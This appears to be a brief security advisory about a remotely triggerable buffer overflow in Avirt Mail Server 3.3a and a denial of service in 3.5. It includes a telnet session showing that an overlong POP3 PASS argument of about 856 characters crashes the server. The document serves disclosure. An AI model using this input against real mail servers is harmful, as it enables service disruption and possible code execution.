Avirt Mail Server 3.3a or 3.5 remotely exploitable buffer overflow
vulnerability
Problem:

We found a remotely exploitable buffer overflow in the Avirt Mail Server
3.3a and a D.o.S
in the version 3.5, (long USER / PASS:) that may allow an attacker to
execute arbitrary code on the target server.
Example:


[hell@mordoc]$ telnet example.com 110    <<<< sorry are port 110
Trying example.com...
Connected to example.com.
Escape character is '^]'.
+OK aVirt Mail POP3 Server Ready
user itsme
+OK
Pass [buffer]


Where [buffer] is aprox. 856 characters. At his point the server overflows
and crashes. Just a typical buffer overflow
